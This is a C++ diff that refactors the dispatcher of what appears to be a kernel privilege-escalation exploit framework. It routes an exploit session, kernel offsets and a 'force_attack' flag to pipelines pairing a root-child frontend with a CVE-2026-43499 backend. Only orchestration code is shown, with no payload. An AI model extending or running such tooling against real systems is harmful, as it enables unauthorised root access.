@@ -10,43 +10,34 @@
 
 namespace ghostlock::runtime {
     /* NativeOrchestrator (Batch 3/4): validate the component selection outside
-     * the sensitive window and dispatch the catalogued combination through a
-     * nested switch of direct template calls (no indirect dispatch). The nested
-     * switch enumerates exactly the tuples combination_supported() admits;
-     * anything else is RunCode::Rejected. */
+     * the sensitive window and dispatch the catalogued combination through
+     * direct template calls (no indirect dispatch). The switch enumerates the
+     * exact values component_catalog::dispatch_target() can return, and the
+     * Pipeline template instantiations are compile-time checked against the
+     * catalogue, so predicate and dispatch share one authority. */
     [[nodiscard]] inline RunResult run_orchestrated_pipeline(
         session::ExploitSession &exploit_session, const ComponentSelection &selection,
         const profile::kernel_offsets &decoded, const char *debug_dir, bool force_attack) {
-        if (!combination_supported(selection)) return RunResult{.code = RunCode::Rejected};
-        switch (selection.frontend) {
-            case FrontendKind::RootChild:
-                switch (selection.backend) {
-                    case BackendKind::Cve2026_43499:
-                        switch (selection.middleware) {
-                            case MiddlewareKind::SelectStack:
-                                return run_pipeline<session::frontend::RootChildPolicy,
-                                                    session::backend::Cve2026_43499Policy,
-                                                    route::SelectPolicy>(
-                                    exploit_session, decoded, debug_dir, force_attack);
-                            case MiddlewareKind::TcpZerocopy:
-                                return run_pipeline<session::frontend::RootChildPolicy,
-                                                    session::backend::Cve2026_43499Policy,
-                                                    route::TcpPolicy>(
-                                    exploit_session, decoded, debug_dir, force_attack);
-                            case MiddlewareKind::MulticastWaiter:
-                                return run_pipeline<session::frontend::RootChildPolicy,
-                                                    session::backend::Cve2026_43499Policy,
-                                                    route::MulticastPolicy>(
-                                    exploit_session, decoded, debug_dir, force_attack);
-                            default:
-                                return RunResult{.code = RunCode::Rejected};
-                        }
-                    default:
-                        return RunResult{.code = RunCode::Rejected};
-                }
-            default:
+        switch (dispatch_target(selection)) {
+            case DispatchTarget::SelectStack:
+                return Pipeline<session::frontend::RootChildPolicy,
+                                session::backend::Cve2026_43499Policy,
+                                route::SelectPolicy>::run(
+                    exploit_session, decoded, debug_dir, force_attack);
+            case DispatchTarget::TcpZerocopy:
+                return Pipeline<session::frontend::RootChildPolicy,
+                                session::backend::Cve2026_43499Policy,
+                                route::TcpPolicy>::run(
+                    exploit_session, decoded, debug_dir, force_attack);
+            case DispatchTarget::MulticastWaiter:
+                return Pipeline<session::frontend::RootChildPolicy,
+                                session::backend::Cve2026_43499Policy,
+                                route::MulticastPolicy>::run(
+                    exploit_session, decoded, debug_dir, force_attack);
+            case DispatchTarget::None:
                 return RunResult{.code = RunCode::Rejected};
         }
+        return RunResult{.code = RunCode::Rejected};
     }
 } // namespace ghostlock::runtime
 
